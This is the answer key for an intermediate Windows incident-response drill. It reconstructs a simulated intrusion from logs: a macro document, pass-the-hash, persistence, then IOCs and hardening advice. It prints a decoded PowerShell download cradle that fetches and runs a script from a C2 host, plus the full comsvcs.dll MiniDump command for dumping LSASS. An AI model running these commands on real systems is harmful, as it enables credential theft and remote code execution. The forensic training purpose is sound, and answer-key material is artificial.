# Solution: Drill 01 (Intermediate) — Windows Incident Response

## Answer Key

---

### Task 1: Initial Access — How Was `jdavis` Compromised?

**Q1: What process executed just before the Defender alert at 14:32?**

```powershell
$events = Get-Content /drill/logs/Security.evtx.json | ConvertFrom-Json
$events | Where-Object { $_.EventID -eq 4688 } | Format-Table TimeCreated, SubjectUserName, NewProcessName, CommandLine -Wrap
```

**Answer:** At 14:22:11, `WINWORD.EXE` (Microsoft Word) spawned `cmd.exe`, which then launched `powershell.exe` with a base64-encoded command at 14:22:13.
The chain is:

```text
WINWORD.EXE → cmd.exe → powershell.exe -nop -w hidden -enc <base64>
```

**Q2: Was there a suspicious document or file opened by `jdavis` prior to credential dumping?**

From the MFT timeline and Prefetch:

```text
2024-01-15T14:21:55Z  OPEN  C:\Users\jdavis\Documents\Q4_Financial_Report_FINAL.docm
```

**Answer:** Yes — `Q4_Financial_Report_FINAL.docm` (a macro-enabled Word document) was opened at 14:21:55, 16 seconds before the malicious process chain started.
This is a **spear-phishing document with a macro** (VBA macro delivery via `.docm`).

**Q3: What was the parent process of the suspicious activity?**

**Answer:** `C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE` — Microsoft Word.
This is a classic **macro-enabled document** (T1566.001 Spear-Phishing Attachment) that executes a PowerShell download cradle.

**Decode the base64 payload:**

```powershell
[Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAHMAdABhAGcAZQAxAC4AcABzADEAJwApAA=='))
```

Result: `IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.100/stage1.ps1')`

This is a **PowerShell download cradle** that fetches and executes `stage1.ps1` from the attacker C2 at `192.168.1.100`.

---

### Task 2: Credential Dumping — What Was Taken?

**Q1: Which tool or technique was used to dump credentials from LSASS?**

From Sysmon Event ID 10 (Process Access) and Security Event ID 4688:

* `rundll32.exe` accessed `lsass.exe` with access rights `0x1FFFFF` (PROCESS_ALL_ACCESS)
* The DLL used is `comsvcs.dll` (a built-in Windows DLL)

**Answer:** **`comsvcs.dll MiniDump`** — a Living-off-the-Land Binary (LOLBin) technique.
No external tool was required; the attacker used a legitimate Windows component.

**Q2: What was the full command line used?**

```text
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump 624 C:\Users\jdavis\AppData\Local\Temp\svc.dmp full
```

* `624` = PID of `lsass.exe`
* `svc.dmp` = output minidump file (misleading name to appear like a service dump)

**Q3: Was the dump file written to disk?
If so, where?**

From Sysmon Event ID 11 (File Created) and MFT timeline:

```text
2024-01-15T14:30:06Z  CREATE  C:\Users\jdavis\AppData\Local\Temp\svc.dmp  41943040 bytes (~40 MB)
```

**Answer:** Yes. `C:\Users\jdavis\AppData\Local\Temp\svc.dmp` — a 40 MB LSASS memory dump written to the user's Temp folder.

**Q4: What MITRE ATT&CK technique ID covers this activity?**

**Answer:** **T1003.001 — OS Credential Dumping: LSASS Memory**

---

### Task 3: Lateral Movement — Pivoting to `svc_backup`

**Q1: What logon type was used for the lateral movement to `FS-CORP-01`?**

From Security Event ID 4624:

```json
{"LogonType": 3, "TargetUserName": "svc_backup", "IpAddress": "10.10.10.50"}
```

**Answer:** **Logon Type 3 (Network Logon)** — used for SMB/file share access.

**Q2: How did the attacker obtain `svc_backup` credentials?**

From PowerShell script block log (14:37:45):

```text
# svc_backup : NTLMhash = aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
```

The LSASS dump (`svc.dmp`) contained the `svc_backup` NTLM hash.
The attacker extracted it from the dump and used it for a **Pass-the-Hash** attack.

**Answer:** Credentials were extracted from the LSASS minidump (`svc.dmp`).
The `svc_backup` service account's NTLM hash was used in a **Pass-the-Hash** attack (T1550.002) — no plaintext password was needed.

**Q3: What authentication protocol was negotiated?**

From Security Event ID 4624: `AuthenticationPackage: NTLM`

**Answer:** **NTLM** — confirming pass-the-hash.
If Kerberos had been used, `AuthenticationPackage` would show `Kerberos`.

**Q4: What was accessed on `FS-CORP-01`?**

From MFT timeline:

```text
2024-01-15T14:38:15Z  ACCESS  \\FS-CORP-01\backup$\db_backup_20240114.bak
2024-01-15T14:38:16Z  ACCESS  \\FS-CORP-01\backup$\credentials.kdbx
```

**Answer:** Two files were accessed on `\\FS-CORP-01\backup$`:

1. `db_backup_20240114.bak` — database backup (potential data exfiltration)
1. `credentials.kdbx` — a **KeePass credentials database** (high-value target)

---

### Task 4: Persistence — Establishing a Foothold

**Q1: Was a new Windows service installed?**

From Security Event ID 7045:

```json
{"ServiceName": "WinUpdateSvc", "ImagePath": "C:\\Windows\\Temp\\svchost32.exe -k netsvcs", "StartType": "Auto Start", "AccountName": "LocalSystem"}
```

**Answer:** Yes.
Service `WinUpdateSvc` was installed at 14:41:05, running `C:\Windows\Temp\svchost32.exe` as LocalSystem with Auto Start.
The binary name `svchost32.exe` is designed to blend in with legitimate `svchost.exe` processes.

**Q2: Was a scheduled task created?**

From Security Event ID 4698:

```json
{"TaskName": "\\Microsoft\\Windows\\MicrosoftEdgeUpdater", "TaskContent": "<Exec><Command>C:\\Users\\jdavis\\AppData\\Roaming\\svchost.exe</Command>..."}
```

**Answer:** Yes.
Task `\Microsoft\Windows\MicrosoftEdgeUpdater` was created, executing `C:\Users\jdavis\AppData\Roaming\svchost.exe` at startup.
The task name impersonates a Microsoft Edge update task.

**Q3: Was a registry Run key added?**

From registry artifacts:

```json
[
  {"Hive":"HKCU","Key":"...\\Run","ValueName":"WindowsDefenderUpdate","ValueData":"...\\svchost.exe"},
  {"Hive":"HKLM","Key":"...\\Run","ValueName":"WindowsUpdate","ValueData":"...\\svchost32.exe"}
]
```

**Answer:** Two Run keys were added:

* `HKCU\...\Run\WindowsDefenderUpdate` → user-level persistence for `jdavis`
* `HKLM\...\Run\WindowsUpdate` → system-level persistence

**Q4: What payload/tool was planted for persistence?**

**Answer:** Two distinct payloads:

1. `C:\Windows\Temp\svchost32.exe` — system-level implant (service + HKLM Run key)
1. `C:\Users\jdavis\AppData\Roaming\svchost.exe` — user-level implant (scheduled task + HKCU Run key)

Both maintain a C2 callback to `192.168.1.100:4443`.

---

### Task 5: Timeline Reconstruction

**Complete Attack Timeline:**

| Time (UTC) | Event | MITRE ATT&CK |
|------------|-------|--------------|
| 14:21:55 | `jdavis` opens `Q4_Financial_Report_FINAL.docm` | T1566.001 Spear-Phishing Attachment |
| 14:22:11 | WINWORD.EXE spawns cmd.exe | T1204.002 Malicious File |
| 14:22:13 | cmd.exe launches `powershell.exe -enc <b64>` | T1059.001 PowerShell |
| 14:22:14 | PowerShell connects to 192.168.1.100:80 | T1071.001 Web Protocol C2 |
| 14:22:18 | `stage1.ps1` written to Temp; beacon.bin dropped | T1027 Obfuscated Files |
| 14:30:02 | PS script enumerates lsass.exe PID | T1003.001 LSASS Memory |
| 14:30:04 | `rundll32 comsvcs.dll MiniDump` executes | T1003.001 LSASS Memory |
| 14:30:05 | lsass.exe accessed with PROCESS_ALL_ACCESS | T1003.001 LSASS Memory |
| 14:30:06 | `svc.dmp` (~40 MB LSASS dump) written | T1003.001 LSASS Memory |
| 14:32:00 | Windows Defender alert fires | — |
| 14:37:45 | `svc_backup` NTLM hash extracted from dump | T1550.002 Pass-the-Hash |
| 14:38:15 | SMB connect to `\\FS-CORP-01\backup$` | T1021.002 SMB/Windows Admin Shares |
| 14:38:15 | `db_backup_20240114.bak` accessed | T1039 Data from Network Shared Drive |
| 14:38:16 | `credentials.kdbx` accessed | T1552 Unsecured Credentials |
| 14:40:58 | `svchost32.exe` downloaded and written | T1105 Ingress Tool Transfer |
| 14:41:05 | Service `WinUpdateSvc` installed (AutoStart) | T1543.003 Windows Service |
| 14:43:00 | `svchost.exe` (user payload) dropped | T1105 Ingress Tool Transfer |
| 14:43:17 | Scheduled task `MicrosoftEdgeUpdater` created | T1053.005 Scheduled Task |
| 14:44:02 | HKCU Run key added | T1547.001 Registry Run Keys |
| 14:45:00 | Security event log cleared | T1070.001 Clear Windows Event Logs |

**Q1: First malicious event:** 14:21:55 — opening of the malicious `.docm` file.

**Q2: Time from initial compromise to credential dumping:** ~8 minutes (14:22 → 14:30).

**Q3: Time from credential dumping to lateral movement:** ~8 minutes (14:30 → 14:38).

**Q4: Kill Chain phases:**

| Phase | Events |
|-------|--------|
| Initial Access | Spear-phishing macro document |
| Execution | PowerShell download cradle, macro execution |
| Defense Evasion | Encoded commands, LOLBin (comsvcs.dll) |
| Credential Access | LSASS dump via comsvcs.dll MiniDump |
| Lateral Movement | Pass-the-hash to FS-CORP-01 |
| Collection | Accessing db_backup, credentials.kdbx |
| Persistence | Service + Scheduled Task + Registry Run |
| C2 | Beacon callback to 192.168.1.100:4443 |
| Cover Tracks | Security log cleared |

---

### Task 6: IOCs and Remediation

**IOCs:**

| Type | Value | Description |
|------|-------|-------------|
| File | `Q4_Financial_Report_FINAL.docm` | Malicious macro document |
| File | `C:\Users\jdavis\AppData\Local\Temp\stage1.ps1` | PS downloader |
| File | `C:\Users\jdavis\AppData\Local\Temp\beacon.bin` | Implant stage 1 |
| File | `C:\Users\jdavis\AppData\Local\Temp\svc.dmp` | LSASS dump |
| File | `C:\Windows\Temp\svchost32.exe` | Malware (service) |
| File | `C:\Users\jdavis\AppData\Roaming\svchost.exe` | Malware (user persistence) |
| IP | `192.168.1.100` | Attacker C2 server |
| Port | `4443` | C2 callback port |
| Registry | `HKCU\...\Run\WindowsDefenderUpdate` | User persistence |
| Registry | `HKLM\...\Run\WindowsUpdate` | System persistence |
| Service | `WinUpdateSvc` | Malicious service |
| Task | `\Microsoft\Windows\MicrosoftEdgeUpdater` | Malicious scheduled task |
| MD5 | `A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6` | cmd.exe launch hash |
| MD5 | `5B4C3D2E1F0A9B8C7D6E5F4A3B2C1D0E` | rundll32 (comsvcs dump) hash |

**Compromised Accounts:**

* `jdavis` — initial victim via macro document
* `svc_backup` — credentials stolen from LSASS dump, used for lateral movement

**Immediate Containment:**

1. Isolate `WKS-FINANCE-07` from the network
1. Force password reset for `jdavis` and `svc_backup`
1. Disable `svc_backup` account pending investigation
1. Block `192.168.1.100` at perimeter firewall and proxy
1. Remove malicious service and scheduled task
1. Delete malicious files from disk
1. Preserve forensic image before any remediation

**Long-Term Hardening:**

1. **Macro policy**: Disable VBA macros from internet-origin documents via Group Policy
1. **LSASS protection**: Enable RunAsPPL (`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1`) and Credential Guard
1. **Disable WDigest**: `HKLM\SYSTEM\...\WDigest\UseLogonCredential = 0`
1. **Privileged accounts**: Use **Group Managed Service Accounts (gMSA)** — no static password, no cached hash
1. **SMB access controls**: Restrict which accounts can access file server shares; require Kerberos for sensitive resources
1. **Attack Surface Reduction rules**: Enable "Block Office applications from creating child processes" and "Block credential stealing from LSASS"
1. **PowerShell**: Enforce Constrained Language Mode and require signed scripts
1. **Log retention**: Enable PowerShell Script Block Logging, Sysmon with LSASS access rules, and centralize logs to SIEM

---

## MITRE ATT&CK Summary

| ID | Technique | Observed |
|----|-----------|---------|
| T1566.001 | Spear-Phishing Attachment | Macro-enabled `.docm` |
| T1204.002 | Malicious File | User opened the document |
| T1059.001 | PowerShell | Encoded download cradle |
| T1027 | Obfuscated Files or Information | Base64-encoded PS command |
| T1071.001 | Application Layer Protocol: Web | HTTP C2 to 192.168.1.100 |
| T1105 | Ingress Tool Transfer | Downloading payloads from C2 |
| T1003.001 | OS Credential Dumping: LSASS Memory | comsvcs.dll MiniDump |
| T1550.002 | Use Alternate Authentication Material: Pass-the-Hash | svc_backup NTLM hash |
| T1021.002 | Remote Services: SMB/Windows Admin Shares | \\FS-CORP-01\backup$ |
| T1039 | Data from Network Shared Drive | db_backup, credentials.kdbx |
| T1543.003 | Create or Modify System Process: Windows Service | WinUpdateSvc |
| T1053.005 | Scheduled Task/Job: Scheduled Task | MicrosoftEdgeUpdater |
| T1547.001 | Boot or Logon Autostart: Registry Run Keys | HKCU/HKLM Run keys |
| T1070.001 | Indicator Removal: Clear Windows Event Logs | Security log cleared |
